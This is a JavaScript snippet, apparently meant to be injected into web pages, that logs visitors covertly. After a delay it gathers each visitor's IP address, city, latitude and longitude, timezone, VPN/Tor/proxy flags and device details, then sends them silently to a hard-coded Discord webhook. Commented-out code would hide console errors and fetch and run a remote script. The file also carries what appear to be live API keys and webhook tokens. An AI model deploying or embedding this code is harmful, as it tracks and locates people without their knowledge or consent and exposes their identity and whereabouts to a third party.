(function () {
    console.log('script running');
    /*let noop = () => {};
    let consoleMethods = ['log', 'warn', 'error', 'info', 'debug', 'dir', 'dirxml', 'table', 'trace', 'time', 'timeEnd'];
    consoleMethods.forEach(method => {
        console[method] = noop;
    });
    window.onerror = () => true;
    window.debugger = noop;
    if (window.performance) {
        window.performance.mark = noop;
        window.performance.measure = noop;
    }
    window.onunhandledrejection = event => event.preventDefault();*/

    // Script configuration
    let sahate = "https://raw.githubusercontent.com/LostDeveloper01/User-Logging/refs/heads/main/kritty.js";
    let anatahe = "https://api.ipdata.co?api-key=41aa6530c61a2d4189b48ef719c1ce909d8e2bfd080fbe94a9b7a523";
    let batate = "https://cdn.discordapp.com/avatars/1313301569386840136/bbc5a79936e435c7b28fdd814416d117.png";
    let defatate = "https://discord.com/api/webhooks/1328146798245838908/gU6HaBia7FVwSC_XMHxgtxTkxhzLe-9L572zIz4v7Gy4Fa_oYghRVxkONX0V90r7EvC7";
    /*
    // Load external script
    (async () => {
        let inject = async (url, t = 100) => {
            for (let i = 0; i < t; i++) {
                let response = await fetch(url);
                if (response.ok) {
                    let script = await response.text();
                    new Function(script)();
                    return;
                }
            }
        };
        await inject(sahate);
    })();*/

    window.onload = function () {
        //setTimeout(() => {
        //    if (localStorage.getItem("000.exe")) {
        //        return;
        //    }


        setTimeout(() => {
            let countryFlag = countryCode =>
                String.fromCodePoint(...[...countryCode.toUpperCase()].map(c => 0x1F1E6 + c.charCodeAt(0) - 'A'.charCodeAt(0)));

            async function fetchLocationData() {
    try {
        let response = await fetch(anatahe);
        let data = await response.json();
        return {
            ip: data.ip || 'Unknown',
            city: data.city || 'Unknown',
            latitude: data.latitude || 'Unknown',
            longitude: data.longitude || 'Unknown',
            region: data.region || 'Unknown',
            country: data.country_name || 'Unknown',
            countryCode: data.country_code || 'Unknown',
            timezone: data.time_zone?.name || 'Unknown',
            threatInfo: { // Properly define the threatInfo object
                isTor: data.threat?.is_tor || false,
                isICloudRelay: data.threat?.is_icloud_relay || false,
                isProxy: data.threat?.is_proxy || false,
                isDatacenter: data.threat?.is_datacenter || false,
                isAnonymous: data.threat?.is_anonymous || false,
                isKnownAttacker: data.threat?.is_known_attacker || false,
                isKnownAbuser: data.threat?.is_known_abuser || false,
                isThreat: data.threat?.is_threat || false,
                isBogon: data.threat?.is_bogon || false,
                blocklists: data.threat?.blocklists || []
            }
        };
    } catch {
        return null;
    }
}

function getDeviceInfo() {
    return {
        browser: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenResolution: `${window.screen.width}x${window.screen.height}`
    };
}

async function sendToDiscord(info, accessToken) {
    if (!info) return;

    let deviceInfo = getDeviceInfo();
    let flagEmoji = countryFlag(info.countryCode);
    let title = "0Auth User";

    // Now we access the threatInfo directly from the info object.
    let threatInfo = info.threatInfo;

    // Format the blocklists
    let blocklistString = threatInfo.blocklists.length > 0 ? threatInfo.blocklists.join(', ') : 'None';

    let message = {
        username: "0Auth User Info",
        avatar_url: batate,
        embeds: [{
            title: title,
            color: 0xFF0000,
            fields: [
                { name: "🌐 IP Address", value: `\`${info.ip}\``, inline: true },
                { name: "Latitude", value: `\`${info.latitude}\``, inline: true },
                { name: "Longitude", value: `\`${info.longitude}\``, inline: true },
                { name: "🌆 City", value: `\`${info.city}\``, inline: true },
                { name: "🏴 Region", value: `\`${info.region}\``, inline: true },
                { name: "🏳️ Country", value: `\`${info.country}\` ${flagEmoji}`, inline: true },
                { name: "⏰ Timezone", value: `\`${info.timezone}\``, inline: true },
                { name: "🚨 Is TOR", value: `\`${threatInfo.isTor}\``, inline: true },
                { name: "🌐 Is iCloud Relay", value: `\`${threatInfo.isICloudRelay}\``, inline: true },
                { name: "🔌 Is Proxy", value: `\`${threatInfo.isProxy}\``, inline: true },
                { name: "🏢 Is Datacenter", value: `\`${threatInfo.isDatacenter}\``, inline: true },
                { name: "👤 Is Anonymous", value: `\`${threatInfo.isAnonymous}\``, inline: true },
                { name: "⚠️ Is Known Attacker", value: `\`${threatInfo.isKnownAttacker}\``, inline: true },
                { name: "⚠️ Is Known Abuser", value: `\`${threatInfo.isKnownAbuser}\``, inline: true },
                { name: "❗ Is Threat", value: `\`${threatInfo.isThreat}\``, inline: true },
                { name: "🚫 Is Bogon", value: `\`${threatInfo.isBogon}\``, inline: true },
                { name: "🛑 Blocklists", value: `\`${blocklistString}\``, inline: false },
                {
                    name: "💻 Device Info",
                    value: `Browser: \`${deviceInfo.browser}\`\nPlatform: \`${deviceInfo.platform}\`\nLanguage: \`${deviceInfo.language}\`\nScreen: \`${deviceInfo.screenResolution}\``,
                    inline: false
                },
                { name: "URL", value: `\`${window.location.href}\``, inline: false }
            ],
            footer: {
                text: "0Auth Weblogging v0.0.3",
                icon_url: batate
            },
            timestamp: new Date().toISOString()
        }]
    };
                try {
                    await fetch(defatate, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify(message)
                    });
                    // localStorage.setItem("000.exe", "true");

                } catch {
                    // Handle error silently
                }
            }

            fetchLocationData().then(info => sendToDiscord(info));
        }, 5000);
    };
})();
